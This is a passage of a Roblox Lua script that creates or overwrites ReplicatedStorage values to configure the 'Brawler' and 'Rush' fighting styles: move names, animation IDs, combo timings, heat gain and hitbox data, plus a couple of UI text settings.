v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullStunned"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullStunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullStunned""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack4'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Brawler[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'GGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""BlockStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""BlockStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""BlockStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmashing'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Escape'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""RedHeat""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_GuruParry'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StanceStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""StanceStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""StanceStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StrikeThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""StrikeThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold'
v.Name = ""StrikeThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StanceFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StanceFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_HeadPressUp'
v.Name = ""H_StanceFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Brawler[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Legend'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Brawler[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DoubleBlows"") then
v = game.ReplicatedStorage.Styles.Brawler[""DoubleBlows""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""DoubleBlows""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike3'
v.Name = ""2Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike1'
v.Name = ""2Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike2'
v.Name = ""2Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike4'
v.Name = ""2Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeBack'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeForward'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeLeft'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeRight'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DashAttack"") then
v = game.ReplicatedStorage.Styles.Brawler[""DashAttack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'RDashAttack'
v.Name = ""DashAttack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Distanced"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Distanced""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_Distanced""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Fisticuffs'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllRight"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllRight""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterRight'
v.Name = ""H_CounterSoloAllRight""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllLeft"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllLeft""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterLeft'
v.Name = ""H_CounterSoloAllLeft""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllFront"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterFront'
v.Name = ""H_CounterSoloAllFront""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllBack"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllBack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterBack'
v.Name = ""H_CounterSoloAllBack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding2"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabStanding2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_RunningFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_RunningFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FinishingBlow'
v.Name = ""H_RunningFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StandingBehind"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StandingBehind""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_KnockOut'
v.Name = ""H_StandingBehind""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_SuperEvading"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_SuperEvading""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Rolling'
v.Name = ""H_SuperEvading""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Brawler[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'DragonTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold2'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingHandgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingHandgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperHandgun'
v.Name = ""H_GunStandingHandgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopper'
v.Name = ""H_GunStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Brawler[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Brawler.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Brawler.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Moves.H_UltimateEssence:FindFirstChild(""MoveName"") then
v = game.ReplicatedStorage.Moves.H_UltimateEssence[""MoveName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_UltimateEssence)
end
v.Value = 'Ultimate Essence '
v.Name = ""MoveName""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Closest"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Closest""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '40'
v.Name = ""Closest""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Distance"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Distance""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '50'
v.Name = ""Distance""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Within"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Within""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '15'
v.Name = ""Within""
                                                                                                                                                                                                                                                                                                                                                                                                                                                main.Heat.noheattho.Text = ""Heat Actions Disabled""
	                                                                                                                                                                                                                                                                                                                                                                                                                                            main.Heat.noheattho.Size = UDim2.new(10, 0, 1, 0)

	                                                                                                                                                                                                                                                                                                                                                                                                                                            menu.Bars.Mobile_Title.Visible = true

if game.ReplicatedStorage.Moves:FindFirstChild(""DragonTaunt"") then
v = game.ReplicatedStorage.Moves[""DragonTaunt""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves)
end
v.Name = ""DragonTaunt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dmg""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0
v.Name = ""Dmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HitboxLocations"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HitboxLocations""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = '[[""RightHand"",3,[0,-1,0]],[""RightLowerArm"",1.5,[0,0,0]],[""RightUpperArm"",1,[0,0,0]]]'
v.Name = ""HitboxLocations""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.225
v.Name = ""AniSpeed""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Sound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Sound""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 'Yell'
v.Name = ""Sound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""NoDmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""NoDmg""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""NoDmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.15
v.Name = ""HeatAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatGain"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatGain""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 20
v.Name = ""HeatGain""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""ForceSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""ForceSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""ForceSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""TauntSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""TauntSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""TauntSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""EndAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""EndAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.8
v.Name = ""EndAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves.DragonTaunt)
end

v.AnimationId = ""rbxassetid://10928237540""
v.Name = ""Anim""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveForward"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveForward""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 2
v.Name = ""MoveForward""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveStart2"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveStart2""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.8
v.Name = ""MoveStart2""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveDuration"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveDuration""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.4
v.Name = ""MoveDuration""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dragon"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dragon""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Dragon""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Cancelable"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Cancelable""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Cancelable""
if game.ReplicatedStorage.Moves[""龍Attack1""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack1""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack1""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack2""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack2""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack2""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack3""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack3""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack3""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack4""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack4""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack4""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Strike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Strike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Strike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""BStrike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""BStrike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""BStrike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Styles:FindFirstChild(""Rush"") then
v = game.ReplicatedStorage.Styles[""Rush""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Rush""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunning"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunning""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Reversal'
v.Name = ""H_Stunning""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Rush[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://10848090844""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Rush[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RushTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Rush[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 1.2
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Rush[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = Color3.fromRGB(254, 01, 154)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Rush[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Rush[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Rush'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Rush[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_CrushingWall'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Rush[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RSweep'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Rush[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FrenzySpinCounter'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FlyingKick'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush5"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush5""]
else
